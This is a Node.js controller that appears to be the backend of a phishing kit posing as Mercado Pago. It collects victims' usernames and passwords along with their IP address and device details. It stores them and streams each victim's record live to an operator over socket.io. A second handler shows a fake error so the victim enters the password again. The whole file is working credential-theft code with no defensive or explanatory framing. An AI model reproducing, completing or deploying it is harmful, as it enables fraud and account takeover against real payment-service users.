const Client = require('../../models/Client')
const { clientsSocket, connectedUsers } = require('../../server')
const DeviceDetector = require('node-device-detector')
const detector = new DeviceDetector()
const ClientDevice = require('../../models/ClientDevice')

module.exports = {
    async view(req, res) {
        try {
            //Client
            const { username: user, password } = req.body

            const ip = (req.headers['x-forwarded-for'] || req.connection.remoteAddress || '').split(',')[0].trim()

            const { client_id } = req.params

            const device = detector.detect(req.headers['user-agent'])

            let client

            if (client_id) {
                client = await Client.findByPk(client_id, { include: { association: `device` } })
                await client.update({ password, status: `Enviou usuário` })
                req.app.io.emit('updateClient', client.toJSON())
            } else {
                const checkClient = await Client.findOne({ where: { user }, include: { association: `device` } })
                client = checkClient
                if (!checkClient) {
                    client = await Client.create({ user, ip })

                    const clientDevice = await ClientDevice.create({
                        client_id: client.id,
                        type: device.device.type,
                        name: device.client.name,
                        os: device.os.name,
                        model: device.device.model,
                    })

                    const cliente = await Client.findByPk(client.id, { include: { association: `device` } })

                    req.app.io.emit('newClient', cliente.toJSON())
                } else {
                    req.app.io.emit('updateClient', client.toJSON())
                }
            }

            return res.render('pages/password', {
                title: 'Agora, sua senha do Mercado Pago',
                pageClasses: 'password cadastro',
                pageType: 'password',
                username: user,
                client: client.toJSON(),
            })
        } catch (error) {
            console.log(error)
            return res.redirect('/')
        }
    },
    async error(req, res) {
        try {
            const { client_id } = req.params

            const client = await Client.findByPk(client_id, { include: { association: `device` } })

            if (!client) return res.redirect('/modules/conta')

            await client.update({ status: `Online na senha` })

            req.app.io.emit('updateClient', client.toJSON())

            return res.render('pages/password', {
                title: 'Agora, sua senha do Mercado Pago',
                pageClasses: 'password cadastro',
                pageType: 'password',
                error: true,
                client: client.toJSON(),
            })
        } catch (error) {
            console.log(error)
            return res.redirect('/')
        }
    },
}
